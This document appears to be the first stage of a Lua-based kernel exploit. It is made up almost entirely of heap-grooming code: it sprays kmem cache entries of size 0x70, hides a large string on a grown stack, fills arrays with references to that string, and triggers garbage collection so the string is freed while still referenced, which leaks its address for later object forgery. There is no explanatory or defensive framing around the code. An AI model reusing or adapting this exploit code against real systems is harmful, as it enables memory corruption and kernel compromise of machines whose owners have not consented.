-- Stage1 - we leak a string address that we will later use to 
-- forge Lua objects, stored in the ForgeS global.


function HideString(s)
  -- Around stack index 77, lua_state_info struct is 112 byte
  local x0 = NewString("BBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC")
  local x1 = NewString("BBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC") 
  local x2 = x1 
  local x3 = x1
  local x4 = x1 
  local x5 = x1 
  local x6 = x1 
  local x7 = x1 
  local x8 = x1 
  local x9 = x1
  local y0 = x1
  local y1 = x1 
  local y2 = x1 
  local y3 = x1 
  local y4 = x1 
  local y5 = x1 
  local y6 = x1 
  local y7 = x1 
  local y8 = x1 
  local y9 = x1 
  local z0 = x1 
  local z1 = x1 
  local z2 = x1 
  local z3 = x1 
  local z4 = x1 
  local z5 = x1 
  local z6 = x1 
  local z7 = x1 
  local z8 = x1 
  local z9 = x1 
end


function AllocForgeSArrays()
  -- 31 arrays of size 0x70
  c0 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  c1 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  c2 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  c3 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  c4 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  c5 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  c6 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  c7 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  c8 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  c9 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  d0 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  d1 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  d2 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  d3 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  d4 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  d5 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  d6 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  d7 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  d8 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  d9 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  e0 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  e1 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  e2 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  e3 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  e4 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  e5 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  e6 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  e7 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  e8 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  e9 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
  f0 = {ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS, ForgeS}
end

function ReleaseForgeSArrays()
  c0 = nil
  c1 = nil
  c2 = nil
  c3 = nil
  c4 = nil
  c5 = nil
  c6 = nil
  c7 = nil
  c8 = nil
  c9 = nil
  d0 = nil
  d1 = nil
  d2 = nil
  d3 = nil
  d4 = nil
  d5 = nil
  d6 = nil
  d7 = nil
  d8 = nil
  d9 = nil
  e0 = nil
  e1 = nil
  e2 = nil
  e3 = nil
  e4 = nil
  e5 = nil
  e6 = nil
  e7 = nil
  e8 = nil
  e9 = nil
  f0 = nil
end

-- String fits into kmem cache size 4096
ForgeS = NewString([[ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ]])

-- Consume existing kmem cache entries in bucket size 0x70, avoiding transient 
-- array allocations in our target cache size.
local i = 0
KmemSpray70 = {
  {1,2,3,4,5,6,7},
  {1,2,3,4,5,6,7},
  {1,2,3,4,5,6,7},
  {1,2,3,4,5,6,7},
  {1,2,3,4,5,6,7},
  {1,2,3,4,5,6,7},
  {1,2,3,4,5,6,7},
  {1,2,3,4,5,6,7},
  {1,2,3,4,5,6,7},
  {1,2,3,4,5,6,7},
}
while i < 0x40 do
  KmemSpray70[i + 1] = {1,2,3,4,5,6,7}
  i = i + 1
end

-- Grow the stack and hide the string 
GrowStack(0, HideString)

-- Allocate our Arrays with references to ForgeS
AllocForgeSArrays()

-- Trigger GC, freeing the string and shrinking the stack
TriggerGC(20)
